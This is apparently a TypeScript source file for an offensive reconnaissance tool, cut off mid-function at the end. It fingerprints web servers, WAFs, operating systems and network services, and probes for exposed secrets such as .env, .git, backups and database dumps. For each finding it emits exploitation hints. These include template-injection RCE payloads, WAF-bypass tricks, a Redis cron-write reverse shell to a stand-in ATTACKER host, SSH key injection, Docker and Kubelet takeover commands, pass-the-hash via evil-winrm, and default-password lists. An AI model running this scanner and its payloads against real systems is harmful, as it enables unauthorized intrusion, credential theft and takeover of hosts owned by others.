import * as http from "http";
import * as https from "https";
import * as net from "net";

export interface TargetEnvironment {
  url:           string;
  reachable:     boolean;
  statusCode:    number;
  os:            "windows" | "linux" | "unknown";
  osConfidence:  "high" | "medium" | "low";
  server:        string;
  language:      string;
  framework:     string;
  cms:           string;
  waf:           string | null;
  wafConfidence: "high" | "medium" | "low";
  headers:       Record<string, string>;
  cookies:       string[];
  responseTime:  number;
  bodyLength:    number;
  bodyPreview:   string;
  redirectUrl:   string | null;
  injectHints:   string[];
}

interface RawResponse {
  status:   number;
  headers:  Record<string, string>;
  body:     string;
  elapsed:  number;
}

function rawRequest(
  url: string,
  method: string,
  reqHeaders: Record<string, string>,
  body: string | null,
  timeoutMs: number,
): Promise<RawResponse | null> {
  return new Promise((resolve) => {
    let parsed: URL;
    try { parsed = new URL(url); } catch { resolve(null); return; }

    const useHttps = parsed.protocol === "https:";
    const port     = parsed.port ? Number(parsed.port) : (useHttps ? 443 : 80);
    const path     = (parsed.pathname || "/") + (parsed.search || "");
    const bodyBuf  = body ? Buffer.from(body, "utf8") : null;

    const httpsAgent = useHttps ? new https.Agent({ rejectUnauthorized: false }) : undefined;

    const opts: http.RequestOptions = {
      hostname: parsed.hostname,
      port,
      path,
      method,
      headers:  { ...reqHeaders, ...(bodyBuf ? { "Content-Length": String(bodyBuf.length) } : {}) },
      timeout:  timeoutMs,
      ...(httpsAgent ? { agent: httpsAgent } : {}),
    };

    const t0  = Date.now();
    const mod = useHttps ? https : http;
    let settled = false;
    const settle = (v: RawResponse | null) => { if (!settled) { settled = true; resolve(v); } };
    const timer   = setTimeout(() => settle(null), timeoutMs + 500);

    const req = mod.request(opts, (res) => {
      const hdrs: Record<string, string> = {};
      for (const [k, v] of Object.entries(res.headers)) {
        if (typeof v === "string") hdrs[k.toLowerCase()] = v;
        else if (Array.isArray(v)) hdrs[k.toLowerCase()] = v.join(", ");
      }
      let chunks = "";
      res.on("data", (d: Buffer) => { if (chunks.length < 8192) chunks += d.toString("utf8"); });
      res.on("end", () => {
        clearTimeout(timer);
        settle({ status: res.statusCode ?? 0, headers: hdrs, body: chunks, elapsed: Date.now() - t0 });
      });
      res.on("error", () => { clearTimeout(timer); settle(null); });
    });

    req.on("error",   () => { clearTimeout(timer); settle(null); });
    req.on("timeout", () => { req.destroy(); clearTimeout(timer); settle(null); });
    if (bodyBuf) req.write(bodyBuf);
    req.end();
  });
}

function detectWaf(
  status: number,
  headers: Record<string, string>,
  body: string,
  cookies: string[],
): { waf: string | null; confidence: "high" | "medium" | "low" } {
  const h = headers;
  const b = body.toLowerCase();
  const cookieStr = cookies.join(" ").toLowerCase();

  if (h["cf-ray"] || h["server"] === "cloudflare" || h["cf-cache-status"]) {
    return { waf: "Cloudflare", confidence: "high" };
  }
  if (cookieStr.includes("incap_ses_") || cookieStr.includes("visid_incap_") || h["x-iinfo"]) {
    return { waf: "Imperva/Incapsula", confidence: "high" };
  }
  if (h["x-sucuri-id"] || h["x-sucuri-cache"]) {
    return { waf: "Sucuri", confidence: "high" };
  }
  if (h["x-check-cacheable"] || h["x-akamai-transformed"] || Object.keys(h).some(k => k.startsWith("x-akamai-"))) {
    return { waf: "Akamai", confidence: "high" };
  }
  if (h["x-amzn-requestid"] || h["x-amzn-trace-id"] || b.includes("aws waf")) {
    return { waf: "AWS WAF", confidence: "high" };
  }
  if (h["server"]?.toLowerCase().includes("bigip") || cookieStr.includes("bigipserver")) {
    return { waf: "F5 BIG-IP ASM", confidence: "high" };
  }
  if (Object.keys(h).some(k => k.startsWith("x-datadome"))) {
    return { waf: "DataDome", confidence: "high" };
  }
  if (Object.keys(h).some(k => k.startsWith("x-px-")) || b.includes("perimeterx") || b.includes("px-captcha")) {
    return { waf: "PerimeterX", confidence: "high" };
  }
  if (h["x-fastly-request-id"] || h["fastly-restarts"] !== undefined) {
    return { waf: "Fastly WAF", confidence: "medium" };
  }
  if (cookieStr.includes("barra_counter")) {
    return { waf: "Barracuda", confidence: "high" };
  }
  if (h["server"]?.toLowerCase().includes("mod_security") || b.includes("mod_security") || b.includes("modsecurity")) {
    return { waf: "ModSecurity", confidence: "high" };
  }
  if (cookieStr.includes("wfvt_") || b.includes("wordfence")) {
    return { waf: "Wordfence", confidence: "high" };
  }
  if (Object.keys(h).some(k => k.startsWith("x-sp-"))) {
    return { waf: "StackPath", confidence: "medium" };
  }
  if (h["x-varnish"] || h["via"]?.includes("varnish")) {
    return { waf: null, confidence: "low" };
  }
  if (status === 403 && (b.includes("access denied") || b.includes("forbidden") || b.includes("blocked"))) {
    return { waf: "Generic WAF", confidence: "low" };
  }
  if (status === 406 || (status === 403 && b.includes("not acceptable"))) {
    return { waf: "ModSecurity (406)", confidence: "medium" };
  }
  return { waf: null, confidence: "low" };
}

function detectStack(
  headers: Record<string, string>,
  body: string,
  cookies: string[],
): { server: string; language: string; framework: string; cms: string } {
  const h          = headers;
  const b          = body.toLowerCase();
  const xpb        = (h["x-powered-by"] ?? "").toLowerCase();
  const serverHdr  = (h["server"] ?? "").toLowerCase();
  const cookieStr  = cookies.join(" ").toLowerCase();
  const xRuntime   = (h["x-runtime"] ?? "").toLowerCase();
  const xGenerator = (h["x-generator"] ?? "").toLowerCase();
  const generator  = body.match(/<meta[^>]+name=["']generator["'][^>]+content=["']([^"']+)["']/i)?.[1] ?? "";

  let server    = "";
  let language  = "";
  let framework = "";
  let cms       = "";

  if (serverHdr.includes("nginx"))           server = serverHdr.match(/nginx\/[\d.]+/i)?.[0]?.toUpperCase() ?? "Nginx";
  else if (serverHdr.includes("apache"))     server = serverHdr.match(/apache\/[\d.]+/i)?.[0]?.toUpperCase() ?? "Apache";
  else if (serverHdr.includes("microsoft-iis")) server = serverHdr.match(/Microsoft-IIS\/[\d.]+/i)?.[0] ?? "IIS";
  else if (serverHdr.includes("litespeed"))  server = "LiteSpeed";
  else if (serverHdr.includes("caddy"))      server = "Caddy";
  else if (serverHdr.includes("gunicorn"))   server = "Gunicorn";
  else if (serverHdr.includes("uvicorn"))    server = "Uvicorn";
  else if (serverHdr.includes("node"))       server = "Node.js";
  else if (serverHdr)                        server = h["server"] ?? "";

  if (xpb.startsWith("php") || cookieStr.includes("phpsessid")) {
    language  = "PHP " + (h["x-powered-by"]?.match(/PHP\/[\d.]+/i)?.[0]?.replace("PHP/", "") ?? "");
    framework = "PHP";
  } else if (xpb.includes("express")) {
    language  = "Node.js";
    framework = "Express";
  } else if (xpb.includes("asp.net") || h["x-aspnet-version"] || h["x-aspnetmvc-version"] || cookieStr.includes("asp.net_sessionid")) {
    language  = ".NET";
    framework = h["x-aspnetmvc-version"] ? "ASP.NET MVC " + h["x-aspnetmvc-version"] : "ASP.NET " + (h["x-aspnet-version"] ?? "");
  } else if (xRuntime.startsWith("ruby") || xpb.includes("rails")) {
    language  = "Ruby";
    framework = "Rails";
  } else if (xpb.includes("python") || serverHdr.includes("werkzeug") || serverHdr.includes("python")) {
    language  = "Python";
    framework = serverHdr.includes("werkzeug") ? "Flask/Werkzeug" : "Python";
  } else if (cookieStr.includes("jsessionid")) {
    language  = "Java";
    framework = "Java Servlet";
  } else if (h["x-nextjs-page"] || h["x-nextjs-matched-path"]) {
    language  = "Node.js";
    framework = "Next.js";
  } else if (h["x-drupal-cache"] || h["x-generator"]?.includes("drupal")) {
    language  = "PHP";
    framework = "Drupal";
  }

  if (generator.toLowerCase().includes("wordpress") || b.includes("/wp-content/") || b.includes("wp-includes")) {
    cms = "WordPress";
    if (!language) language = "PHP";
  } else if (generator.toLowerCase().includes("joomla") || b.includes("/media/jui/") || b.includes("joomla")) {
    cms = "Joomla";
    if (!language) language = "PHP";
  } else if (b.includes("sites/default/files") || h["x-drupal-cache"]) {
    cms = "Drupal";
    if (!language) language = "PHP";
  } else if (b.includes("magento") || cookieStr.includes("frontend=")) {
    cms = "Magento";
    if (!language) language = "PHP";
  } else if (b.includes("strapi")) {
    cms = "Strapi";
    if (!language) language = "Node.js";
  } else if (b.includes("x-ghost-cache-status") || h["x-ghost-cache-status"]) {
    cms = "Ghost";
    if (!language) language = "Node.js";
  }

  const spFramework =
    b.includes("laravel") || cookieStr.includes("laravel_session")  ? "Laravel" :
    b.includes("__django") || cookieStr.includes("csrftoken")        ? "Django"  :
    cookieStr.includes("session") && language === "Python"           ? "Flask"   :
    b.includes("spring") || b.includes("springframework")            ? "Spring"  :
    b.includes("struts")                                             ? "Struts"  :
    b.includes("thymeleaf")                                          ? "Spring/Thymeleaf" :
    b.includes("rails") && language === "Ruby"                       ? "Rails"   : "";

  if (spFramework && !framework) framework = spFramework;

  return { server, language: language.trim(), framework: framework.trim(), cms };
}

function detectOS(
  headers: Record<string, string>,
  body:    string,
  server:  string,
  language: string,
): { os: "windows" | "linux" | "unknown"; osConfidence: "high" | "medium" | "low" } {
  const h        = headers;
  const b        = body.toLowerCase();
  const serverLo = server.toLowerCase();
  const xpb      = (h["x-powered-by"] ?? "").toLowerCase();

  /* ── Windows signals ──────────────────────────────────────────────── */
  const winHigh =
    serverLo.includes("microsoft-iis") ||
    serverLo.includes("iis") ||
    !!h["x-aspnet-version"] ||
    !!h["x-aspnetmvc-version"] ||
    xpb.includes("asp.net") ||
    xpb.includes(".net");

  const winMedium =
    b.includes("__viewstate") ||
    b.includes("__eventvalidation") ||
    b.includes("__dopostback") ||
    b.includes("asp.net_sessionid") ||
    b.includes("system.web.") ||
    b.includes("system.exception") ||
    b.includes("\\inetpub\\") ||
    b.includes("c:\\windows\\") ||
    b.includes("windows\\system32") ||
    (b.includes("windows") && b.includes("ntfs")) ||
    /[a-z]:\\[a-z]/i.test(body);

  const winCookie =
    (h["set-cookie"] ?? "").toLowerCase().includes("asp.net_sessionid");

  if (winHigh || winCookie) return { os: "windows", osConfidence: "high"   };
  if (winMedium)            return { os: "windows", osConfidence: "medium" };

  /* ── Linux signals ────────────────────────────────────────────────── */
  const linuxHigh =
    serverLo.includes("nginx")     ||
    serverLo.includes("apache")    ||
    serverLo.includes("litespeed") ||
    serverLo.includes("gunicorn")  ||
    serverLo.includes("uvicorn")   ||
    serverLo.includes("openresty");

  const linuxMedium =
    language.toLowerCase().includes("php")    ||
    language.toLowerCase().includes("python") ||
    language.toLowerCase().includes("ruby")   ||
    b.includes("/var/www/")   ||
    b.includes("/etc/nginx")  ||
    b.includes("/etc/apache") ||
    b.includes("/usr/share/") ||
    b.includes("no input file specified") ||
    b.includes("permission denied")          ||
    /uid=\d+\(/.test(body)   ||
    /linux \S+ \d+\.\d+\.\d+/i.test(body);

  if (linuxHigh)   return { os: "linux", osConfidence: "high"   };
  if (linuxMedium) return { os: "linux", osConfidence: "medium" };

  return { os: "unknown", osConfidence: "low" };
}

function detectInjectHints(
  headers: Record<string, string>,
  language: string,
  framework: string,
  cms: string,
  waf: string | null,
): string[] {
  const hints: string[] = [];

  if (language.includes("PHP"))      hints.push("PHP: try ?param=id+%3B+phpinfo()");
  if (language.includes("Java"))     hints.push("Java: try SSTI ${7*7} or Log4Shell ${jndi:ldap://...}");
  if (language === "Python")         hints.push("Python: try SSTI {{7*7}} or {{config}}");
  if (language === "Ruby")           hints.push("Ruby: try SSTI <%= 7*7 %>");
  if (framework.includes("Spring")) hints.push("Spring EL: try ${T(java.lang.Runtime).getRuntime().exec('id')}");
  if (framework.includes("Django")) hints.push("Django: try {{settings.SECRET_KEY}}");
  if (framework.includes("Flask"))  hints.push("Flask/Jinja2: try {{config.__class__.__init__.__globals__['os'].popen('id').read()}}");
  if (framework.includes("Rails"))  hints.push("Rails: try <%= `id` %> in ERB context");
  if (cms === "WordPress")          hints.push("WordPress: try /?author=1 for user enum, /wp-login.php brute, RCE via plugin editor");
  if (waf === "Cloudflare")         hints.push("Cloudflare: use double-URL encoding, IFS substitution, or b64decode chains");
  if (waf === "ModSecurity")        hints.push("ModSecurity: try null-byte injection, comment breaks, or b64 eval chains");
  if (waf === "AWS WAF")            hints.push("AWS WAF: try body size > 8KB split, multipart bypass, or JSON key unicode escape");
  if (!waf)                         hints.push("No WAF detected — direct injection likely feasible");

  return hints;
}

const TCP_SERVICE_NAMES: Record<number, string> = {
  21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
  80: "HTTP", 110: "POP3", 143: "IMAP", 389: "LDAP", 443: "HTTPS",
  445: "SMB", 465: "SMTPS", 587: "SMTP-TLS", 636: "LDAPS",
  873: "Rsync", 993: "IMAPS", 995: "POP3S", 1433: "MSSQL",
  1521: "Oracle", 2049: "NFS", 2375: "Docker", 2376: "DockerTLS",
  2379: "etcd", 3306: "MySQL", 3389: "RDP", 4444: "Metasploit",
  5432: "PostgreSQL", 5900: "VNC", 5984: "CouchDB", 5985: "WinRM",
  5986: "WinRMS", 6379: "Redis", 6443: "Kubernetes", 7474: "Neo4j",
  8080: "HTTP-Proxy", 8443: "HTTPS-Alt", 8888: "Jupyter",
  9200: "Elasticsearch", 9300: "ES-Cluster", 10250: "Kubelet",
  11211: "Memcached", 15672: "RabbitMQ", 27017: "MongoDB",
};

const TCP_PROBES: Record<number, Buffer> = {
  6379:  Buffer.from("INFO server\r\n"),
  11211: Buffer.from("stats\r\n"),
  25:    Buffer.from("EHLO probe.nexus\r\n"),
  587:   Buffer.from("EHLO probe.nexus\r\n"),
  465:   Buffer.from("EHLO probe.nexus\r\n"),
  9200:  Buffer.from("GET / HTTP/1.0\r\nHost: target\r\nConnection: close\r\n\r\n"),
  5984:  Buffer.from("GET / HTTP/1.0\r\nHost: target\r\nConnection: close\r\n\r\n"),
  2375:  Buffer.from("GET /info HTTP/1.0\r\nHost: target\r\nConnection: close\r\n\r\n"),
  10250: Buffer.from("GET /pods HTTP/1.0\r\nHost: target\r\nConnection: close\r\n\r\n"),
  8888:  Buffer.from("GET /api HTTP/1.0\r\nHost: target\r\nConnection: close\r\n\r\n"),
};

export interface ServiceFingerprint {
  port:      number;
  service:   string;
  version:   string;
  banner:    string;
  vulnHints: string[];
}

export interface WebDiscovery {
  gitExposed:  boolean;
  robotsTxt:   string;
  adminPanels: { path: string; status: number }[];
  phpinfo:     boolean;
  dirListing:  boolean;
  sensitiveFiles: { path: string; status: number }[];
  statusMap:   Record<string, number>;
}

function tcpRead(
  host:      string,
  port:      number,
  sendBuf:   Buffer | null,
  timeoutMs: number,
): Promise<{ ok: boolean; data: Buffer }> {
  return new Promise((resolve) => {
    const sock = new net.Socket();
    const chunks: Buffer[] = [];
    let ok = false;
    let done = false;

    const finish = () => {
      if (done) return;
      done = true;
      try { sock.destroy(); } catch { /* */ }
      resolve({ ok, data: Buffer.concat(chunks) });
    };

    const hard = setTimeout(finish, timeoutMs + 500);
    sock.setTimeout(timeoutMs);

    sock.on("connect", () => {
      ok = true;
      if (sendBuf) sock.write(sendBuf);
      setTimeout(finish, Math.min(timeoutMs, 1400));
    });
    sock.on("data", (c: Buffer) => {
      const total = chunks.reduce((s, b) => s + b.length, 0);
      if (total < 8192) chunks.push(c);
    });
    sock.on("timeout", () => { clearTimeout(hard); finish(); });
    sock.on("error",   () => { clearTimeout(hard); finish(); });
    sock.on("close",   () => { clearTimeout(hard); finish(); });
    try { sock.connect(port, host); } catch { clearTimeout(hard); finish(); }
  });
}

function sshVulnHints(version: string): string[] {
  const hints: string[] = [];
  const m = version.match(/OpenSSH[_\s]([\d.]+)/i);
  if (m) {
    const parts = m[1]!.split(".").map(Number);
    const maj = parts[0] ?? 0;
    const min = parts[1] ?? 0;
    if (maj < 9 || (maj === 9 && min < 3)) {
      hints.push(`OpenSSH ${m[1]} — check CVE-2023-38408 (agent RCE), CVE-2023-25136 (pre-auth double-free)`);
    }
    if (maj < 8 || (maj === 8 && min < 5)) {
      hints.push(`OpenSSH ${m[1]} — username enumeration timing (CVE-2018-15473), weak KEX negotiation`);
    }
  }
  if (/Dropbear/i.test(version)) hints.push("Dropbear SSH — check CVE-2017-9078 (local priv esc), CVE-2016-7406 (format string)");
  if (!hints.length) hints.push("Try: password brute-force, key reuse, ProxyJump pivot");
  return hints;
}

function mysqlVulnHints(version: string): string[] {
  const hints: string[] = ["Check: anonymous login, root without password, UDF injection via SELECT INTO OUTFILE"];
  const m = version.match(/(\d+)\.(\d+)/);
  if (m) {
    const maj = Number(m[1]);
    const min = Number(m[2]);
    if (maj === 5 && min <= 6) hints.push(`MySQL ${version} — CVE-2012-2122 authentication bypass, slow_query_log RCE`);
    if (maj < 8) hints.push(`MySQL ${version} < 8.0 — check CVE-2016-6662 (LOAD DATA, my.cnf write RCE)`);
  }
  return hints;
}

function buildFingerprint(port: number, data: Buffer): ServiceFingerprint {
  const service  = TCP_SERVICE_NAMES[port] ?? `port-${port}`;
  const text     = data.toString("utf8", 0, Math.min(data.length, 1024));
  const firstLine = text.split(/\r?\n/)[0]?.replace(/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f-\x9f]/g, "").trim() ?? "";

  switch (port) {
    case 22: {
      const version = firstLine.startsWith("SSH-") ? firstLine.slice(0, 80) : (firstLine || "SSH");
      return { port, service, version, banner: firstLine, vulnHints: sshVulnHints(version) };
    }
    case 21: {
      const version = firstLine.replace(/^220[\s-]*/i, "").slice(0, 80) || "FTP";
      const hints = ["Try: anonymous login (user: anonymous, pass: anon@anon.com)", "Check: writable directories, .bash_history leaks"];
      if (/vsftpd\s*2\.3\.4/i.test(text)) hints.unshift("vsftpd 2.3.4 BACKDOOR — CVE-2011-2523: connect port 6200 after AUTH smiley");
      if (/proftpd/i.test(text)) hints.push("ProFTPd — mod_copy CPFR/CPTO unauthenticated file copy (CVE-2015-3306)");
      if (/exim/i.test(text)) hints.push("Exim on FTP port — misconfig likely");
      return { port, service, version, banner: firstLine, vulnHints: hints };
    }
    case 25: case 465: case 587: {
      const version = firstLine.replace(/^220[\s-]*/i, "").slice(0, 80) || "SMTP";
      const hints = ["Try: VRFY/EXPN user enumeration, open relay test (RCPT TO: external@domain)"];
      if (/exim/i.test(text)) hints.push("Exim — CVE-2019-10149 (RCPT TO local RCE), CVE-2020-28007, CVE-2021-38371");
      if (/postfix/i.test(text)) hints.push("Postfix — check header injection, BDAT command");
      if (/sendmail/i.test(text)) hints.push("Sendmail — CVE-2014-3956, SMTP injection via long header lines");
      const ehloLines = text.split("\n").filter(l => /^250[\s-]/i.test(l)).map(l => l.replace(/^250[\s-]/i, "").trim());
      if (ehloLines.length) hints.push(`ESMTP features: ${ehloLines.join(", ")}`);
      return { port, service, version, banner: firstLine, vulnHints: hints };
    }
    case 3306: {
      let version = "";
      if (data.length > 5 && data[4] === 0x0a) {
        const nulAt = data.indexOf(0x00, 5);
        version = data.slice(5, nulAt > 5 ? nulAt : Math.min(5 + 40, data.length)).toString("utf8").trim();
      } else {
        version = firstLine.slice(0, 40) || "MySQL";
      }
      return { port, service, version: version || "MySQL", banner: version, vulnHints: mysqlVulnHints(version) };
    }
    case 5432: {
      const hints = ["Check: pg_hba.conf trust auth for local/all, postgres user without password"];
      if (data.length > 0 && data[0] === 0x45) hints.unshift("PostgreSQL sending error — likely rejects unauthenticated; check auth method");
      hints.push("Try: psql -h host -U postgres, check pg_shadow, COPY TO STDOUT file read");
      return { port, service, version: "PostgreSQL", banner: firstLine || "PostgreSQL", vulnHints: hints };
    }
    case 6379: {
      const ver = text.match(/redis_version:([^\s\r\n]+)/)?.[1];
      const isNoAuth = text.startsWith("*") || text.startsWith("$") || text.includes("redis_version");
      const hints: string[] = [];
      if (isNoAuth) {
        hints.push("Redis UNAUTHENTICATED — full RCE: write cron (config set dir /var/spool/cron && config set dbfilename root && set x \"\\n\\n* * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1\\n\\n\" && save)");
        hints.push("Redis — SSH key write: config set dir /root/.ssh && config set dbfilename authorized_keys && set x \"\\n\\nATTACKER_PUB_KEY\\n\\n\" && save");
        hints.push("Redis — module load for OS RCE if Redis 4.x+: MODULE LOAD /path/to/module.so");
      } else if (text.startsWith("-NOAUTH") || text.startsWith("-ERR")) {
        hints.push("Redis requires authentication — try: config/redis.conf, .env files, default passwords (redis, password, 123456)");
      }
      return { port, service, version: ver ? `Redis ${ver}` : "Redis", banner: ver ?? "Redis", vulnHints: hints };
    }
    case 27017: {
      const hints = ["MongoDB — check: no auth (db.adminCommand({listDatabases:1})), user enum, insert RCE via server-side JS"];
      if (data.length === 0) hints.push("No data returned — may require MongoDB wire protocol handshake");
      return { port, service, version: "MongoDB", banner: "MongoDB", vulnHints: hints };
    }
    case 11211: {
      const ver = text.match(/STAT version ([^\s\r\n]+)/)?.[1];
      const hints = ["Memcached unauthenticated — check: stats items, cache poisoning, SSRF amplification (UDP port 11211)"];
      return { port, service, version: ver ? `Memcached ${ver}` : "Memcached", banner: ver ?? "Memcached", vulnHints: hints };
    }
    case 2375: {
      const ver = text.match(/"ServerVersion"\s*:\s*"([^"]+)"/)?.[1] ?? text.match(/"Version"\s*:\s*"([^"]+)"/)?.[1];
      const hints = [
        "Docker API UNAUTHENTICATED — full host takeover: docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        "Docker — create privileged container: docker run --privileged -v /:/host busybox",
        "Docker — extract secrets from running containers: docker inspect $(docker ps -q)",
      ];
      return { port, service, version: ver ? `Docker ${ver}` : "Docker", banner: ver ?? "Docker", vulnHints: hints };
    }
    case 5900: {
      const ver = firstLine.startsWith("RFB") ? firstLine.slice(0, 20) : "VNC";
      const hints = [
        "VNC exposed — check: no-auth security type (type 1 = no auth), CVE-2006-2369 RealVNC auth bypass",
        "Try: vncviewer host:5900, common passwords (admin/admin, root/root, password)",
      ];
      return { port, service, version: ver, banner: ver, vulnHints: hints };
    }
    case 9200: {
      const ver = text.match(/"number"\s*:\s*"([^"]+)"/)?.[1] ?? "Elasticsearch";
      const hints = [
        "Elasticsearch UNAUTHENTICATED — dump all indices: GET /_cat/indices?v",
        "Elasticsearch — search all data: GET /*/_search?size=100",
        "Check: /_nodes for cluster info, /_cat/nodes, script execution via Groovy/Painless (< 5.x)",
      ];
      return { port, service, version: ver ? `Elasticsearch ${ver}` : "Elasticsearch", banner: ver, vulnHints: hints };
    }
    case 5984: {
      const ver = text.match(/"version"\s*:\s*"([^"]+)"/)?.[1];
      const hints = [
        "CouchDB — CVE-2017-12635: PUT /_users/org.couchdb.user:admin creates admin without auth",
        "CouchDB — CVE-2018-8007: server admin OS RCE via config update",
        "Check: /_all_dbs unauthenticated, /_users database",
      ];
      return { port, service, version: ver ? `CouchDB ${ver}` : "CouchDB", banner: ver ?? "CouchDB", vulnHints: hints };
    }
    case 3389: {
      const hints = [
        "RDP — BlueKeep (CVE-2019-0708) pre-auth RCE on Windows 7/Server 2008 (no NLA)",
        "RDP — DejaBlue (CVE-2019-1181/1182) pre-auth RCE on Windows 8.1/Server 2012+",
        "Try: NLA bypass, credential stuffing, Pass-the-Hash via xfreerdp",
        "Check: xfreerdp /v:host /u:Administrator /p:'' — blank password",
      ];
      return { port, service, version: "RDP", banner: "RDP", vulnHints: hints };
    }
    case 5985: case 5986: {
      const hints = [
        "WinRM exposed — use evil-winrm: evil-winrm -i host -u Administrator -p password",
        "WinRM — Pass-the-Hash: evil-winrm -i host -u Administrator -H NTLM_HASH",
        "Check: NTLM relay attack, CVE-2021-31166 (HTTP/1.1 parsing RCE on Windows 10)",
      ];
      return { port, service, version: "WinRM", banner: firstLine || "WinRM", vulnHints: hints };
    }
    case 445: {
      const hints = [
        "SMB — EternalBlue (MS17-010) pre-auth RCE on unpatched Windows (check with: nmap -p 445 --script smb-vuln-ms17-010)",
        "SMB — PrintNightmare (CVE-2021-1675/34527) — SYSTEM via spooler service",
        "SMB — anonymous share enum: smbclient -L //host -N",
        "SMB — check signing: if not required, NTLM relay is possible",
      ];
      return { port, service, version: "SMB", banner: "SMB", vulnHints: hints };
    }
    case 10250: {
      const hints = [
        "Kubelet API unauthenticated — RCE in any container: POST /run/{namespace}/{pod}/{container}",
        "Dump all pods: GET /pods",
        "Exec in pod: POST /exec/{namespace}/{pod}/{container}?command=id",
      ];
      return { port, service, version: "Kubelet", banner: firstLine || "Kubelet", vulnHints: hints };
    }
    case 8888: {
      const isJupyter = text.includes("jupyter") || text.includes("Jupyter") || text.includes("notebook");
      const hints = isJupyter
        ? ["Jupyter Notebook — unauthenticated RCE via POST /api/kernels, execute arbitrary Python", "GET /api/kernels to list kernels, POST /api/kernels/{id}/execute to run code"]
        : [];
      return { port, service, version: "Jupyter", banner: firstLine.slice(0, 60) || "Jupyter", vulnHints: hints };
    }
    default:
      return { port, service, version: firstLine.slice(0, 80), banner: firstLine, vulnHints: [] };
  }
}

export async function probeNetworkServices(
  host:      string,
  ports:     number[],
  timeoutMs = 3000,
): Promise<ServiceFingerprint[]> {
  const results = await Promise.all(
    ports.map(async (port) => {
      const probe = TCP_PROBES[port] ?? null;
      const { ok, data } = await tcpRead(host, port, probe, timeoutMs);
      if (!ok) return null;
      return buildFingerprint(port, data);
    }),
  );
  return results.filter((r): r is ServiceFingerprint => r !== null);
}

const ADMIN_PATHS = new Set([
  "/admin", "/admin.php", "/administrator", "/phpmyadmin", "/pma",
  "/console", "/manager/html", "/actuator", "/actuator/env",
  "/swagger-ui.html", "/api-docs", "/v2/api-docs", "/graphql",
  "/_cat/indices", "/wp-admin",
]);

const DISCOVERY_PATHS = [
  "/.git/HEAD",
  "/robots.txt",
  "/phpinfo.php",
  "/info.php",
  "/wp-login.php",
  "/wp-admin",
  "/admin",
  "/admin.php",
  "/administrator",
  "/phpmyadmin",
  "/pma",
  "/.env",
  "/.htpasswd",
  "/config.php",
  "/web.config",
  "/WEB-INF/web.xml",
  "/_cat/indices",
  "/actuator",
  "/actuator/env",
  "/console",
  "/manager/html",
  "/.DS_Store",
  "/server-status",
  "/server-info",
  "/swagger-ui.html",
  "/api-docs",
  "/v2/api-docs",
  "/graphql",
  "/crossdomain.xml",
  "/sitemap.xml",
  "/.well-known/security.txt",
  "/backup.zip",
  "/backup.tar.gz",
  "/dump.sql",
  "/db.sql",
  "/composer.json",
  "/package.json",
  "/.git/config",
  "/.svn/entries",
  "/Dockerfile",
  "/docker-compose.yml",
];

const SENSITIVE_PATHS = new Set([
  "/.env", "/.htpasswd", "/config.php", "/web.config", "/WEB-INF/web.xml",
  "/.DS_Store", "/.git/config", "/.svn/entries", "/Dockerfile",
  "/docker-compose.yml", "/backup.zip", "/backup.tar.gz", "/dump.sql",
  "/db.sql", "/composer.json", "/package.json", "/.git/HEAD",
]);

export async function probeWebDiscovery(
  baseUrl:   string,
  timeoutMs = 5000,
): Promise<WebDiscovery> {
  let origin: string;
  try {
    const u = new URL(baseUrl);
    origin = `${u.protocol}//${u.host}`;
  } catch {
    return { gitExposed: false, robotsTxt: "", adminPanels: [], phpinfo: false, dirListing: false, sensitiveFiles: [], statusMap: {} };
  }

  const hdrs: Record<string, string> = {
    "User-Agent":    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept":        "text/html,*/*;q=0.8",
    "Cache-Control": "no-cache",
  };

  const probeResults = await Promise.all(
    DISCOVERY_PATHS.map(async (p) => {
      const r = await rawRequest(`${origin}${p}`, "GET", hdrs, null, timeoutMs);
      return { path: p, status: r?.status ?? 0, body: r?.body ?? "" };
    }),
  );

  const statusMap: Record<string, number> = {};
  for (const r of probeResults) statusMap[r.path] = r.status;

  const gitHead    = probeResults.find(r => r.path === "/.git/HEAD");
  const robotsRes  = probeResults.find(r => r.path === "/robots.txt");
  const phpinfoRes = probeResults.find(r => r.path === "/phpinfo.php" || r.path === "/info.php");

  const gitExposed = !!(gitHead?.status === 200 && gitHead.body.startsWith("ref:"));
  const robotsTxt  = robotsRes?.status === 200 ? robotsRes.body.slice(0, 4000) : "";
  const phpinfo    = !!(phpinfoRes?.status === 200 && phpinfoRes.body.toLowerCase().includes("phpinfo"));

  const adminPanels = probeResults
    .filter(r => ADMIN_PATHS.has(r.path) && (r.status === 200 || r.status === 401 || r.status === 302))
    .map(r => ({ path: r.path, status: r.status }));

  const sensitiveFiles = probeResults
    .filter(r => SENSITIVE_PATHS.has(r.path) && r.status === 200 && r.body.length > 0)
    .map(r => ({ path: r.path, status: r.status }));

  const dirListing = probeResults.some(r =>
    r.status === 200 &&
    (r.body.toLowerCase().includes("index of /") ||
     r.body.toLowerCase().includes("directory listing for"))
  );

  return { gitExposed, robotsTxt, adminPanels, phpinfo, dirListing, sensitiveFiles, statusMap };
}

export async function probeTargetEnvironment(
  url: string,
  timeoutMs = 8000,
): Promise<TargetEnvironment> {
  const blank: TargetEnvironment = {
    url, reachable: false, statusCode: 0,
    os: "unknown", osConfidence: "low",
    server: "", language: "", framework: "", cms: "",
    waf: null, wafConfidence: "low",
    headers: {}, cookies: [], responseTime: 0,
    bodyLength: 0, bodyPreview: "", redirectUrl: null, injectHints: [],
  };

  const baseHeaders: Record<string, string> = {
    "User-Agent":      "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection":      "keep-alive",
    "Cache-Control":   "no-cache",
  };

  const res = await rawRequest(url, "GET", baseHeaders, null, timeoutMs);
  if (!res) return blank;

  const cookies = (res.headers["set-cookie"] ?? "").split(/,\s*(?=[a-zA-Z_-]+=)/).map(s => s.trim()).filter(Boolean);
  const { waf, confidence } = detectWaf(res.status, res.headers, res.body, cookies);
  const { server, language, framework, cms } = detectStack(res.headers, res.body, cookies);
  const { os, osConfidence } = detectOS(res.headers, res.body, server, language);
  const injectHints = detectInjectHints(res.headers, language, framework, cms, waf);

  const redirectUrl = res.headers["location"] ?? null;

  return {
    url,
    reachable:     true,
